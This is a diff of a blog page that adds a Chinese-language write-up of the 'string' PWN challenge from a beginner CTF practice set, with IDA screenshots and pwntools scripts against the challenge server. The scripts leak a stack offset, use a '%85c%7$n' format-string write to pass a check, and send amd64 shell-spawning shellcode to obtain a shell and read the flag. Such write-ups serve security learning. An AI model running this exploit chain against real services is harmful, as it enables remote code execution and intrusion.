@@ -410,6 +410,106 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </figure>
 
 <p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>先尝试着跑了一遍 发现有点像一个古董级别的RPG游戏…没啥思路</p>
+<p>那就不多说了 直接载入IDA吧</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>主函数没啥看的 主要就是泄漏了一个数组的地址 继续向sub_400D72步入</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>这里就是常见角色了 稍微步入看下 发现sub_400A7D函数 就是仅仅是在输出和限制我们的选择 如果想继续玩下去就得输入east 没什么好分析的 步入sub_400BB9进行分析 </p>
+<p><a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt></a></p>
+<p>哦吼 看了这么久终于看见一个漏洞 先记录下来 在sub_400BB9中存在格式化字符串漏洞 但是就代码阅读到这里 还是没什么利用思路 继续向下看 终于在sub_400CA6发现关键判断</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>通过慢慢查找 发现在函数中比对的 a1和a1[1] 其实就是主函数刚开始泄漏地址的数组 菜鸡这里当时卡了很久…真的不知道if内是在干啥..后来通过大佬指点 看到将指针v1强制转换为函数类型..简单来说就是执行函数</p>
+<p>看到这里那基本思路形成了 首先是需要我们通过格式化字符串漏洞 将刚开始的数组值修改为一样的 然后写入shellcode 最后利用if内语句执行即可 那么首先需要先写脚本看下主机处的回显位</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1234"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+</code></pre>
+<p>运行脚本 这里我的回显位是8</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>那么接下来就是写脚本利用格式化字符串漏洞了</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
+secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre>
+<p>执行到这一步已经是利用过格式化字符串漏洞 将数组的值修改为一致的了</p>
+<blockquote>
+<p>%85c%7$n是个啥玩意</p>
+<p>这样写是为了更方便的利用格式化字符串漏洞<br>我们都知道 格式化字符串是可以修改数据的值的 也就是利用%n前面字符数来修改<br>但是大部分情况下 都是需要填充十几个 甚至上百个字符 所以创造出了这种格式</p>
+<p>格式:%需要修改成为的值c%回显位$格式化字符</p>
+</blockquote>
+<p>接下来就是输入shellcode了 这方面是菜鸡的短板…经过大佬知道学会了用pwntools生成shellcode</p>
+<p>完整脚本如下</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"secret[0] is "</span><span class="token punctuation">)</span>
+secret0<span class="token operator">=</span>int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name be:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"AAAA"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"So, where you will go?east or up?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"east"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"or leave(0)?:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"'Give me an address'"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>secret0<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"And, you wish is:"</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">"%85c%7$n"</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>运行脚本得到终端 自己cat flag即可</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -435,7 +535,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-08T12:31:27.029Z" itemprop="dateUpdated">2019-10-08 20:31:27</time>
+    最后更新时间：<time datetime="2019-10-09T11:39:26.537Z" itemprop="dateUpdated">2019-10-09 19:39:26</time>
 </span><br>
 
 
@@ -517,7 +617,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CGfsb"><span class="post-toc-number">1.</span> <span class="post-toc-text">CGfsb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#when-did-you-born"><span class="post-toc-number">2.</span> <span class="post-toc-text">when_did_you_born</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hello-pwn"><span class="post-toc-number">3.</span> <span class="post-toc-text">hello_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level0"><span class="post-toc-number">4.</span> <span class="post-toc-text">level0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">level 2</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CGfsb"><span class="post-toc-number">1.</span> <span class="post-toc-text">CGfsb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#when-did-you-born"><span class="post-toc-number">2.</span> <span class="post-toc-text">when_did_you_born</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hello-pwn"><span class="post-toc-number">3.</span> <span class="post-toc-text">hello_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level0"><span class="post-toc-number">4.</span> <span class="post-toc-text">level0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">level 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#string"><span class="post-toc-number">6.</span> <span class="post-toc-text">string</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </div></div></aside>
